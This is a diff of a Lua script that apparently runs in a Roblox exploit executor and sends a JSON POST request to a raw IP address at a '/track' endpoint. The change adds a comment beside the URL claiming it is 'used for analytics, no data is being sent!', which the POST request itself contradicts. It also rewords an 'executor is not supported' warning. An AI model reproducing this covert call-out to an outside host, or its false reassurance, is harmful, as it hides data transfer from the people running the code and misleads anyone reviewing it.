@@ -23,8 +23,6 @@ local success, err = pcall(function()
         [7946217289] = "GB",
     }
 
-    local h = game:GetService("HttpService")
-
     local r = (syn and syn.request)
         or (http and http.request)
         or http_request
@@ -32,7 +30,7 @@ local success, err = pcall(function()
         or request
 
     if not r then
-        warn("No HTTP request function")
+        warn("No HTTP request function found, executor is not supported.")
         return
     end
 
@@ -45,7 +43,7 @@ local success, err = pcall(function()
     end
 
     r({
-        Url = 'http://67.220.85.157:6283/track',
+        Url = 'http://67.220.85.157:6283/track', -- This is used for analytics, no data is being sent!
         Method = 'POST',
         Headers = {
             ['Content-Type'] = 'application/json',
